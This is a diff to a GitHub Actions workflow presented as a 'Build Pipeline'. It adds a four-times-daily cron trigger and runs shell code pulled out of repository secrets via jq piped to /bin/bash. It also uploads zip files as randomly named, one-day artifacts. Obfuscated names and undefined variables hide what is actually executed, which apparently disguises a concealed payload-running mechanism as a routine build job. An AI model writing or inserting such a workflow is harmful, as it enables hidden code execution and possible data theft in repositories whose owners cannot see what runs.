@@ -2,6 +2,8 @@ name: Build Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '9 4,10,16,22 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,16 +24,15 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          gnyl2719: ${{ secrets.gnyl2719 }}
+          ov89390: ${{ secrets.ov89390 }}
         run: |
-          printf '%s' "$gnyl2719" | jq -r .yyfq24079 | /bin/bash
-          printf '%s' "$ksj82153" | jq -r .no6844 | /bin/bash
-          echo $sn4970 | jq -r .plase42460 | /bin/bash
+          printf '%s' "$ov89390" | jq -r .b98082 | /bin/bash
+          printf '%s' "$s4265" | jq -r .kxvyp8 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 8PKPC9sz
+          name: v8MBIOtB
           path: "*.zip"
           retention-days: 1
